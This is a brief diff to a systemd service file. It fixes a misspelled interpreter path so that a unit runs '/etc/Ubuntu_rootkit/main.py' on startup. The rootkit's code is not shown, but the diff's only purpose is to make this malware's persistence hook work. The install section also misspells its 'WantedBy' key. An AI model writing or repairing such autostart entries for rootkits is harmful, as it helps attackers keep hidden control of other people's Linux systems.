@@ -2,7 +2,7 @@
 After=network.service
 
 [Service]
-ExecStart=/bin/pthon3 /etc/Ubuntu_rootkit/main.py
+ExecStart=/bin/python3 /etc/Ubuntu_rootkit/main.py
 
 [Install]
 Wantedby=default.target
